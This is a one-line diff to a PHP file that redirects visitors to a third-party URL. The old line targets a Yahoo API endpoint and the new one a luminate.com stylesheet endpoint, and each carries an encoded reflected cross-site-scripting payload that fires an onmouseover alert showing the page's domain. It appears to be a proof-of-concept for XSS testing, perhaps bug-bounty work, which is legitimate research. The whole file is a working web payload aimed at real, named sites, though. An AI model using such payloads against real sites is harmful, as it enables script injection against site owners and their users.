@@ -1,1 +1,1 @@
-<?php header('location: https://api.view.yahoo.com/api/series/xxxxxa%3Cq~%00onmouseover=alert(0)%3Eqqqq') ?> 
+<?php header('location: https://editor.luminate.com/stripe_dynamic_css?style_id=style-7043347e-krmbvhve&viewer=xprs&parent_style=ff=%3Ca~%0Aonmouseover=alert(document.domain)%3EXXX&v=1.4.1f') ?> 
